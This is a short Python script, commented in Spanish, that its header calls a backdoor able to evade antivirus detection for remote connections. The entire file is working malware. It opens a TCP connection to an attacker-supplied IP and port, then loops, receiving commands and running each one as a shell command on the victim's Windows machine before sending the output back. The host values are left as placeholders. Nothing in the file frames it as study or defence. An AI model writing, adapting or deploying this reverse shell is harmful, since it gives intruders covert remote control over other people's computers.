#!/usr/bin/env python3

"""
Nombre del Script: BackDoor
Autor: Hector Arango 
Github: https://github.com/hmam13
Descripción: BackDoor sin deteccion de antivirus, sencillo para conexiones remotas.
Lenguaje: Python
"""

# ──────────────────────────────────────────────
#  Librerías
# ──────────────────────────────────────────────
import socket
import subprocess

# ──────────────────────────────────────────────
#  Funciones Lógicas
# ──────────────────────────────────────────────
def run(comando):

    comanado_output = subprocess.check_output(comando, shell=True) # Ejecucion de comando a nivel de consola en Windows
    return comanado_output.decode("cp850") 

if __name__ == '__main__':

    # Genera la conexión hacia el servidor establecido.
    socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_cliente.connect((
                            "IP", # Ejemplo: "0.0.0.0"
                            "PUERTO" # No usar comillas. Ejemplo: 443
                            ))

    while True:
        comando = socket_cliente.recv(1024).decode().strip()
        output = run(comando)
        socket_cliente.send(b"\n" + output.encode() + b"\n")